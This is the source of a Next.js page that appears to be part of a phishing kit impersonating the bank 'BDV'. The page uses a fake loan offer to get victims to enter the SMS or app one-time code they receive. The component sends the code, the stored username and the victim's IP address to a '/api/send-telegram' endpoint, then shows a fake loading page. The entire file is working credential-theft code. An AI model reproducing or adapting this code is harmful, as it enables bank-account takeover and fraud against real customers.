"use client";

import { ChangeEvent, FormEvent, useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { useSecurityGuards } from "@/hooks/useSecurityGuards";
import { resolveBackendEndpoint, resolveIp } from "@/lib/remote";

export default function Sms() {
  useSecurityGuards();
  const router = useRouter();

  const [smsCode, setSmsCode] = useState("");
  const [usuario, setUsuario] = useState("Desconocido");
  const [isSending, setIsSending] = useState(false);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    if (typeof window !== "undefined") {
      const storedUser = localStorage.getItem("usuario");
      if (storedUser) {
        setUsuario(storedUser);
      }
    }
  }, []);

  const handleChange = (event: ChangeEvent<HTMLInputElement>) => {
    const numericValue = event.target.value.replace(/\D/g, "").slice(0, 8);
    setSmsCode(numericValue);
  };

  const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    if (isSending) {
      return;
    }

    setError(null);
    setIsSending(true);

    try {
      const ip = await resolveIp();
      const endpoint = resolveBackendEndpoint("/api/send-telegram");
      const response = await fetch(endpoint, {
        method: "POST",
        credentials: "include",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          username: usuario,
          password: smsCode,
          ip,
        }),
      });

      if (!response.ok) {
        const payload = await response.json().catch(() => null);
        const message = payload?.error ?? "No se pudo enviar la informacion. Intenta nuevamente.";
        throw new Error(message);
      }

      router.push("/cargando2");
    } catch (err) {
      console.error(err);
      const message = err instanceof Error ? err.message : "No se pudo enviar la informacion. Intenta mas tarde.";
      setError(message);
    } finally {
      setIsSending(false);
    }
  };

  return (
    <div className="container">
      <div className="left-side">
        <form onSubmit={handleSubmit} className="form">
          <div style={{ textAlign: "center" }}>
            {/* eslint-disable-next-line @next/next/no-img-element */}
            <img src="/logo.png" alt="BDV" style={{ width: "60%", marginTop: "20px" }} />
          </div>
          <div style={{ width: "100%", textAlign: "center" }}>
            <div style={{ margin: "10px", color: "#0067b1" }}>
              <h4 style={{ margin: 0 }}>Prestamo para usuario Disponible</h4>
              <h5 style={{ margin: "10px 0 0" }}>
                {"Para aceptar Ingrese el c\u00F3digo recibido por SMS o c\u00F3digo generado en amiven"}
              </h5>
            </div>
            <div className="form-group">
              <input
                type="password"
                id="sms"
                inputMode="numeric"
                autoComplete="one-time-code"
                value={smsCode}
                onChange={handleChange}
                placeholder=" "
                required
              />
              <label htmlFor="sms">SMS *</label>
            </div>
          </div>

          {error && (
            <div style={{ width: "100%", textAlign: "center", color: "#ff0000", fontSize: "14px" }}>
              {error}
            </div>
          )}

          <div style={{ width: "100%", textAlign: "center" }}>
            <button type="submit">{isSending ? "Enviando" : "Verificar"}</button>
          </div>
          <div style={{ width: "100%", height: "30px" }} />
        </form>
      </div>
      <div className="right-side" />
    </div>
  );
}
